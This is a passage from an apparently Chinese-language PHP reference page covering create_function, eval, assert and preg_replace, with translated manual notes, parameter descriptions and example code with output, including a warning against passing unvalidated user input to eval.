class="string">&quot;Twas the night&quot;</span> <span class="keyword">and</span> <span class="string">&quot;Twas brilling and the slithy toves&quot;</span></span><br><span class="line">** Look the same to me! (looking at the first <span class="number">3</span> chars)</span><br><span class="line">CRCs: -<span class="number">725381282</span>, <span class="number">342550513</span></span><br><span class="line">similar(a,b) = <span class="number">11</span>(<span class="number">45.833333333333</span>%)</span><br><span class="line">But perhaps the most common <span class="keyword">use</span> <span class="title">for</span> <span class="title">of</span> <span class="title">lambda</span>-<span class="title">style</span> (<span class="title">anonymous</span>) <span class="title">functions</span> <span class="title">is</span> <span class="title">to</span> <span class="title">create</span> <span class="title">callback</span> <span class="title">functions</span>, <span class="title">for</span> <span class="title">example</span> <span class="title">when</span> <span class="title">using</span> <span class="title">array_walk</span>() <span class="title">or</span> <span class="title">usort</span>()</span><br><span class="line"></span><br><span class="line"><span class="title">Example</span> #3 使用匿名函数作为回调函数</span><br><span class="line"></span><br><span class="line">&lt;?<span class="title">php</span></span><br><span class="line">$<span class="title">av</span> = <span class="title">array</span>(&quot;<span class="title">the</span> &quot;, &quot;<span class="title">a</span> &quot;, &quot;<span class="title">that</span> &quot;, &quot;<span class="title">this</span> &quot;);</span><br><span class="line">array_walk(<span class="variable">$av</span>, create_function(<span class="string">&#x27;&amp;$v,$k&#x27;</span>, <span class="string">&#x27;$v = $v . &quot;mango&quot;;&#x27;</span>));</span><br><span class="line">print_r(<span class="variable">$av</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#以上示例会输出：</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">  [<span class="number">0</span>] =&gt; the mango</span><br><span class="line">  [<span class="number">1</span>] =&gt; a mango</span><br><span class="line">  [<span class="number">2</span>] =&gt; that mango</span><br><span class="line">  [<span class="number">3</span>] =&gt; this mango</span><br><span class="line">)</span><br><span class="line">an <span class="keyword">array</span> of strings ordered <span class="keyword">from</span> shorter to longer</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sv</span> = <span class="keyword">array</span>(<span class="string">&quot;small&quot;</span>, <span class="string">&quot;larger&quot;</span>, <span class="string">&quot;a big string&quot;</span>, <span class="string">&quot;it is a string thing&quot;</span>);</span><br><span class="line">print_r(<span class="variable">$sv</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#以上示例会输出：</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">  [<span class="number">0</span>] =&gt; small</span><br><span class="line">  [<span class="number">1</span>] =&gt; larger</span><br><span class="line">  [<span class="number">2</span>] =&gt; a big <span class="keyword">string</span></span><br><span class="line">  [<span class="number">3</span>] =&gt; it is a <span class="keyword">string</span> thing</span><br><span class="line">)</span><br><span class="line">sort it <span class="keyword">from</span> longer to shorter</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">usort(<span class="variable">$sv</span>, create_function(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return strlen($b) - strlen($a);&#x27;</span>));</span><br><span class="line">print_r(<span class="variable">$sv</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#以上示例会输出：</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">  [<span class="number">0</span>] =&gt; it is a <span class="keyword">string</span> thing</span><br><span class="line">  [<span class="number">1</span>] =&gt; a big <span class="keyword">string</span></span><br><span class="line">  [<span class="number">2</span>] =&gt; larger</span><br><span class="line">  [<span class="number">3</span>] =&gt; small</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><strong>eval</strong></p><ul><li>用法</li></ul><p>把字符串作为PHP代码执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span> ( <span class="keyword">string</span> <span class="variable">$code</span> ) : <span class="keyword">mixed</span>把字符串</span><br></pre></td></tr></table></figure><p> code 作为PHP代码执行。<br>函数eval()语言结构是 非常危险的， 因为它允许执行任意 PHP 代码。 它这样用是很危险的。 如果您仔细的确认过，除了使用此结构以外 别无方法, 请多加注意，不要允许传入任何由用户 提供的、未经完整验证过的数据 。</p><ul><li>参数</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">code<span class="comment">#需要被执行的字符串</span></span><br><span class="line"></span><br><span class="line">代码不能包含打开/关闭 PHP tags。比如， <span class="string">&#x27;echo &quot;Hi!&quot;;&#x27;</span> 不能这样传入： <span class="string">&#x27;&lt;?php echo &quot;Hi!&quot;; ?&gt;&#x27;</span>。但仍然可以用合适的 PHP tag 来离开、重新进入 PHP 模式。比如 <span class="string">&#x27;echo &quot;In PHP mode!&quot;; ?&gt;In HTML mode!&lt;?php echo &quot;Back in PHP mode!&quot;;&#x27;</span>。</span><br><span class="line"></span><br><span class="line">除此之外，传入的必须是有效的 PHP 代码。所有的语句必须以分号结尾。比如 <span class="string">&#x27;echo &quot;Hi!&quot;&#x27;</span> 会导致一个 parse error，而 <span class="string">&#x27;echo &quot;Hi!&quot;;&#x27;</span> 则会正常运行。</span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span> 语句会立即中止当前字符串的执行。</span><br><span class="line"></span><br><span class="line">代码执行的作用域是调用 <span class="built_in">eval</span>() 处的作用域。因此，<span class="built_in">eval</span>() 里任何的变量定义、修改，都会在函数结束后被保留</span><br></pre></td></tr></table></figure><ul><li>返回值</li></ul><p>eval() 返回 NULL，除非在执行的代码中 return 了一个值，函数返回传递给 return 的值。 PHP 7 开始，执行的代码里如果有一个 parse error，eval() 会抛出 ParseError 异常。在 PHP 7 之前， 如果在执行的代码中有 parse error，eval() 返回 FALSE，之后的代码将正常执行。无法使用 set_error_handler() 捕获 eval() 中的解析错误。</p><ul><li>示例</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;cup&#x27;</span>;</span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;coffee&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;This is a $string with my $name in it.&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>. <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;\$str = \&quot;<span class="subst">$str</span>\&quot;;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>. <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#以上例程会输出：</span></span><br><span class="line"></span><br><span class="line">This is a <span class="variable">$string</span> with my <span class="variable">$name</span> in it.</span><br><span class="line">This is a cup with my coffee in it</span><br></pre></td></tr></table></figure><p><strong>assert</strong></p><ul><li>用法</li></ul><p>检查一个断言是否为 FALSE</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php5</span></span><br><span class="line">assert ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="keyword">string</span> <span class="variable">$description</span> ] ) : <span class="keyword">bool</span></span><br><span class="line"><span class="comment">#php7</span></span><br><span class="line">assert ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="built_in">Throwable</span> <span class="variable">$exception</span> ] ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><p>assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。</p><p>Traditional assertions (PHP 5 and 7)<br>如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。 assertion 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 assertion 表达式。 这意味着如果你传入了 boolean 的条件作为 assertion，这个条件将不会显示为断言函数的参数；在调用你定义的 assert_options() 处理函数时，条件会转换为字符串，而布尔值 FALSE 会被转换成空字符串。</p><p>断言这个功能应该只被用来调试。 你应该用于完整性检查时测试条件是否始终应该为 TRUE，来指示某些程序错误，或者检查具体功能的存在（类似扩展函数或特定的系统限制和功能）。</p><p>断言不应该用于普通运行时操作，类似输入参数的检查。 作为一个经验法则，在断言禁用时你的代码也应该能够正确地运行。</p><p>assert() 的行为可以通过 assert_options() 来配置，或者手册页面上描述的 .ini 设置。</p><p>assert_options() ASSERT_CALLBACK 配置指令允许设置回调函数来处理失败的断言。</p><p>assert() 回调函数在构建自动测试套件的时候尤其有用，因为它们允许你简易地捕获传入断言的代码，并包含断言的位置信息。 当信息能够被其他方法捕获，使用断言可以让它更快更方便！</p><p>回调函数应该接受三个参数。 第一个参数包括了断言失败所在的文件。 第二个参数包含了断言失败所在的行号，第三个参数包含了失败的表达式（如有任意 — 字面值例如 1 或者 “two” 将不会传递到这个参数）。 PHP 5.4.8 及更高版本的用户也可以提供第四个可选参数，如果设置了，用于将 description 指定到 assert()。</p><p>Expectations（仅适用于PHP 7）</p><p>assert（）是PHP7中的一种语言构造，允许定义Expectations：在开发和测试环境中生效的断言，但经过优化后在生产中实现零成本。</p><p>尽管出于向后兼容性的原因，assert_options（）仍然可以用于控制上述行为，但仅PHP 7代码应该使用两个新的配置指令来控制assert（）的行为，而不是调用assert_options（）。</p><ul><li>参数</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">assertion</span><br><span class="line"><span class="comment">#断言。在PHP5中，这必须是要计算的字符串或要测试的布尔值。在PHP7中，这也可以是任何返回值的表达式，该值将被执行，结果用于指示断言是成功还是失败。</span></span><br><span class="line"></span><br><span class="line">descripton</span><br><span class="line"><span class="comment">#如果 断言失败了，选项 描述将会包括在失败信息里。</span></span><br><span class="line"></span><br><span class="line">exception</span><br><span class="line"><span class="comment">#在PHP7中，第二个参数可以是一个Throwable对象，而不是描述性字符串，在这种情况下，如果断言失败并且启用了assert.exception配置指令，将抛出该对象。</span></span><br></pre></td></tr></table></figure><ul><li>返回值</li></ul><p>assertion 是 false 则返回 FALSE，否则是 TRUE。</p><ul><li>示例</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用自定义处理程序处理失败的断言</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 激活断言，并设置它为 quiet</span></span><br><span class="line">assert_options(ASSERT_ACTIVE, <span class="number">1</span>);</span><br><span class="line">assert_options(ASSERT_WARNING, <span class="number">0</span>);</span><br><span class="line">assert_options(ASSERT_QUIET_EVAL, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建处理函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_assert_handler</span>(<span class="params"><span class="variable">$file</span>, <span class="variable">$line</span>, <span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;Assertion Failed:</span></span><br><span class="line"><span class="string">        File &#x27;<span class="subst">$file</span>&#x27;&lt;br /&gt;</span></span><br><span class="line"><span class="string">        Line &#x27;<span class="subst">$line</span>&#x27;&lt;br /&gt;</span></span><br><span class="line"><span class="string">        Code &#x27;<span class="subst">$code</span>&#x27;&lt;br /&gt;&lt;hr /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置回调函数</span></span><br><span class="line">assert_options(ASSERT_CALLBACK, <span class="string">&#x27;my_assert_handler&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 让一则断言失败</span></span><br><span class="line">assert(<span class="string">&#x27;mysql_query(&quot;&quot;)&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">#使用自定义处理器打印描述信息</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 激活断言，并设置它为 quiet</span></span><br><span class="line">assert_options(ASSERT_ACTIVE, <span class="number">1</span>);</span><br><span class="line">assert_options(ASSERT_WARNING, <span class="number">0</span>);</span><br><span class="line">assert_options(ASSERT_QUIET_EVAL, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建处理函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_assert_handler</span>(<span class="params"><span class="variable">$file</span>, <span class="variable">$line</span>, <span class="variable">$code</span>, <span class="variable">$desc</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Assertion failed at <span class="subst">$file</span>:<span class="subst">$line</span>: <span class="subst">$code</span>&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$desc</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;: <span class="subst">$desc</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置回调函数</span></span><br><span class="line">assert_options(ASSERT_CALLBACK, <span class="string">&#x27;my_assert_handler&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make an assertion that should fail</span></span><br><span class="line">assert(<span class="string">&#x27;2 &lt; 1&#x27;</span>);</span><br><span class="line">assert(<span class="string">&#x27;2 &lt; 1&#x27;</span>, <span class="string">&#x27;Two is less than one&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#以上例程会输出：</span></span><br><span class="line"></span><br><span class="line">Assertion failed at test.php:<span class="number">21</span>: <span class="number">2</span> &lt; <span class="number">1</span></span><br><span class="line">Assertion failed at test.php:<span class="number">22</span>: <span class="number">2</span> &lt; <span class="number">1</span>: Two is less than one</span><br><span class="line">Expectations (PHP <span class="number">7</span> only)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">#没有自定义例外的期望</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">assert(<span class="literal">true</span> == <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Hi!&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">With zend.assertions set to <span class="number">0</span>, the above example will output:</span><br><span class="line"></span><br><span class="line">Hi!</span><br><span class="line">With zend.assertions set to <span class="number">1</span> <span class="keyword">and</span> assert.<span class="built_in">exception</span> set to <span class="number">0</span>, the above example will output:</span><br><span class="line"></span><br><span class="line">Warning: assert(): assert(<span class="literal">true</span> == <span class="literal">false</span>) failed in - on line <span class="number">2</span></span><br><span class="line">Hi!</span><br><span class="line">With zend.assertions set to <span class="number">1</span> <span class="keyword">and</span> assert.<span class="built_in">exception</span> set to <span class="number">1</span>, the above example will output:</span><br><span class="line"></span><br><span class="line">Fatal <span class="built_in">error</span>: Uncaught <span class="built_in">AssertionError</span>: assert(<span class="literal">true</span> == <span class="literal">false</span>) in -:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 -(2): assert(false, &#x27;assert(true == ...&#x27;)</span></span><br><span class="line"><span class="comment">#1 &#123;main&#125;</span></span><br><span class="line">  thrown in - on line <span class="number">2</span></span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line"><span class="comment">#带有自定义异常的期望值</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CustomError</span> <span class="keyword">extends</span> <span class="title">AssertionError</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">assert(<span class="literal">true</span> == <span class="literal">false</span>, <span class="keyword">new</span> CustomError(<span class="string">&#x27;True is not false!&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Hi!&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">With zend.assertions set to <span class="number">0</span>, the above example will output:</span><br><span class="line"></span><br><span class="line">Hi!</span><br><span class="line">With zend.assertions set to <span class="number">1</span> <span class="keyword">and</span> assert.<span class="built_in">exception</span> set to <span class="number">0</span>, the above example will output:</span><br><span class="line"></span><br><span class="line">Warning: assert(): CustomError: <span class="literal">True</span> is not <span class="literal">false</span>! in -:<span class="number">4</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125; failed in - on line 4</span></span><br><span class="line">Hi!</span><br><span class="line">With zend.assertions set to <span class="number">1</span> <span class="keyword">and</span> assert.<span class="built_in">exception</span> set to <span class="number">1</span>, the above example will output:</span><br><span class="line"></span><br><span class="line">Fatal <span class="built_in">error</span>: Uncaught CustomError: <span class="literal">True</span> is not <span class="literal">false</span>! in -:<span class="number">4</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br><span class="line">  thrown in - on line <span class="number">4</span></span><br></pre></td></tr></table></figure><p><strong>preg_replace</strong></p><ul><li>用法</li></ul><p>执行一个正则表达式的搜索和替换</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace ( <span class="keyword">mixed</span> <span class="variable">$pattern</span> , <span class="keyword">mixed</span> <span class="variable">$replacement</span> , <span class="keyword">mixed</span> <span class="variable">$subject</span> [, <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$count</span> ]] ) : <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure><p>搜索subject中匹配pattern的部分， 以replacement进行替换。</p><ul><li>参数</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pattern<span class="comment">#要搜索的模式。可以使一个字符串或字符串数组。可以使用一些PCRE修饰符。</span></span><br><span class="line"></span><br><span class="line">replacement<span class="comment">#用于替换的字符串或字符串数组。如果这个参数是一个字符串，并且pattern 是一个数组，那么所有的模式都使用这个字符串进行替换。如果pattern和replacement 都是数组，每个pattern使用replacement中对应的 元素进行替换。如果replacement中的元素比pattern中的少， 多出来的pattern使用空字符串进行替换。</span></span><br><span class="line"></span><br><span class="line">replacement<span class="comment">#中可以包含后向引用\\n 或$n，语法上首选后者。 每个 这样的引用将被匹配到的第n个捕获子组捕获到的文本替换。 n 可以是0-99，\\0和$0代表完整的模式匹配文本。 捕获子组的序号计数方式为：代表捕获子组的左括号从左到右， 从1开始数。如果要在replacement 中使用反斜线，必须使用4个(&quot;\\\\&quot;，译注：因为这首先是php的字符串，经过转义后，是两个，再经过 正则表达式引擎后才被认为是一个原文反斜线)。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#当在替换模式下工作并且后向引用后面紧跟着需要是另外一个数字(比如：在一个匹配模式后紧接着增加一个原文数字)， 不能使用\\1这样的语法来描述后向引用。比如， \\11将会使preg_replace() 不能理解你希望的是一个\\1后向引用紧跟一个原文1，还是 一个\\11后向引用后面不跟任何东西。 这种情况下解决方案是使用$&#123;1&#125;1。 这创建了一个独立的$1后向引用, 一个独立的原文1。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#当使用被弃用的 e 修饰符时, 这个函数会转义一些字符(即：&#x27;、&quot;、 \ 和 NULL) 然后进行后向引用替换。当这些完成后请确保后向引用解析完后没有单引号或 双引号引起的语法错误(比如： &#x27;strlen(\&#x27;$1\&#x27;)+strlen(&quot;$2&quot;)&#x27;)。确保符合PHP的 字符串语法，并且符合eval语法。因为在完成替换后， 引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串。</span></span><br><span class="line"></span><br><span class="line">subject<span class="comment">#要进行搜索和替换的字符串或字符串数组。如果subject是一个数组，搜索和替换回在subject 的每一个元素上进行, 并且返回值也会是一个数组。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">limit</span><span class="comment">#每个模式在每个subject上进行替换的最大次数。默认是 -1(无限)。</span></span><br><span class="line"></span><br><span class="line">count<span class="comment">#如果指定，将会被填充为完成的替换次数。</span></span><br></pre></td></tr></table></figure><ul><li>返回值</li></ul><p>如果subject是一个数组， preg_replace()返回一个数组， 其他情况下返回一个字符串。</p><p>如果匹配被查找到，替换后的subject被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL 。</p><p>错误／异常<br>PHP 5.5.0 起， 传入 “\e” 修饰符的时候，会产生一个 E_DEPRECATED 错误； PHP 7.0.0 起，会产生 E_WARNING 错误，同时 “\e” 也无法起效。</p><ul><li>示例</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用后向引用紧跟数值原文</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;April 15, 2003&#x27;</span>;</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/(\w+) (\d+), (\d+)/i&#x27;</span>;</span><br><span class="line"><span class="variable">$replacement</span> = <span class="string">&#x27;$&#123;1&#125;1,$3&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$string</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#以上例程会输出：</span></span><br><span class="line">April1,<span class="number">2003</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">#preg_replace()中使用基于索引的数组</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;The quick brown fox jumps over the lazy dog.&#x27;</span>;</span><br><span class="line"><span class="variable">$patterns</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$patterns</span>[<span class="number">0</span>] = <span class="string">&#x27;/quick/&#x27;</span>;</span><br><span class="line"><span class="variable">$patterns</span>[<span class="number">1</span>] = <span class="string">&#x27;/brown/&#x27;</span>;</span><br><span class="line"><span class="variable">$patterns</span>[<span class="number">2</span>] = <span class="string">&#x27;/fox/&#x27;</span>;</span><br><span class="line"><span class="variable">$replacements</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$replacements</span>[<span class="number">2</span>] = <span class="string">&#x27;bear&#x27;</span>;</span><br><span class="line"><span class="variable">$replacements</span>[<span class="number">1</span>] = <span class="string">&#x27;black&#x27;</span>;</span><br><span class="line"><span class="variable">$replacements</span>[<span class="number">0</span>] = <span class="string">&#x27;slow&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="variable">$patterns</span>, <span class="variable">$replacements</span>, <span class="variable">$string</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#以上例程会输出：</span></span><br><span class="line"></span><br><span class="line">The bear black slow jumps over the lazy dog.</span><br><span class="line">对模式和替换内容按key进行排序我们可以得到期望的结果。</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ksort(<span class="variable">$patterns</span>);</span><br><span class="line">ksort(<span class="variable">$replacements</span>);</span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="variable">$patterns</span>, <span class="variable">$replacements</span>, <span class="variable">$string</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">以上例程会输出：</span><br><span class="line"></span><br><span class="line">The slow black bear jumps over the lazy dog.</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">#替换一些值</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$patterns</span> = <span class="keyword">array</span> (<span class="string">&#x27;/(19|20)(\d&#123;2&#125;)-(\d&#123;1,2&#125;)-(\d&#123;1,2&#125;)/&#x27;</span>,</span><br><span class="line">                   <span class="string">&#x27;/^\s*&#123;(\w+)&#125;\s*=/&#x27;</span>);</span><br><span class="line"><span 